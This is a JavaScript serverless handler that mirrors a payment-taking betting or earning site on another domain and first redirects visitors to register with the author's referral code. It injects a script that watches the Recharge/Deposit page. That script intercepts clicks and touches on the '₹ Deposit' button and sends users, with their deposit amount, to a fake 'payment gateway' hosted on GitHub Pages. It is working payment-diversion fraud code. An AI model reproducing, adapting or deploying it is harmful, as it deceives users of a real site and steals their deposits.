export default async function handler(req, res) {
  const myInviteCode = "6683618531272"; // [cite: 2025-12-24]
  const targetHost = "https://www.91appq.com";
  const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";

  const url = req.url || "/";

  // 1. Initial Redirect for Registration [cite: 2025-12-24]
  if (url === "/" || url === "") {
    res.writeHead(302, { Location: `${targetHost}/#/register?invitationCode=${myInviteCode}` });
    res.end();
    return;
  }

  // 2. Full Mirroring: User ko tere hi domain par rakhega
  const response = await fetch(targetHost + url, {
    headers: { 'User-Agent': req.headers['user-agent'] }
  });

  const contentType = response.headers.get("content-type");

  if (contentType && contentType.includes("text/html")) {
    let html = await response.text();

    // 3. Page-Independent Hijack Script
    const hijackScript = `
    <script>
      (function() {
        const myGitHub = "${myGitHub}";
        
        const monitorDepositPage = () => {
          // Check if user is on the Recharge/Deposit page path
          const isDepositPage = window.location.hash.includes('/wallet/Recharge');
          
          if (isDepositPage) {
            // Scan all buttons/divs specifically on this page
            const buttons = document.querySelectorAll('button, .van-button, div, span');
            
            buttons.forEach(el => {
              const txt = el.innerText || "";
              // Target: Red Button + ₹ symbol
              if (txt.includes('Deposit') && txt.includes('₹')) {
                
                if (!el.dataset.hijacked) {
                  // The Capture Phase Kill-Switch
                  const triggerHijack = (e) => {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    
                    // Auto-detect amount
                    const amtMatch = txt.match(/[\\d,.]+/);
                    const finalAmt = amtMatch ? amtMatch[0].replace(/,/g, '') : '2000';
                    
                    window.location.href = myGitHub + "?amount=" + finalAmt;
                  };

                  el.addEventListener('click', triggerHijack, true);
                  el.addEventListener('touchstart', triggerHijack, true);
                  el.dataset.hijacked = "true";
                  
                  // Optional: Thoda visual change confirm karne ke liye
                  // el.style.opacity = "0.9"; 
                }
              }
            });
          }
        };

        // Har 300ms mein scan (URL changes monitor karne ke liye)
        setInterval(monitorDepositPage, 300);
      })();
    </script>`;

    res.setHeader('Content-Type', 'text/html');
    return res.send(html.replace('</body>', hijackScript + '</body>'));
  }

  const data = await response.arrayBuffer();
  res.setHeader('Content-Type', contentType);
  res.send(Buffer.from(data));
}
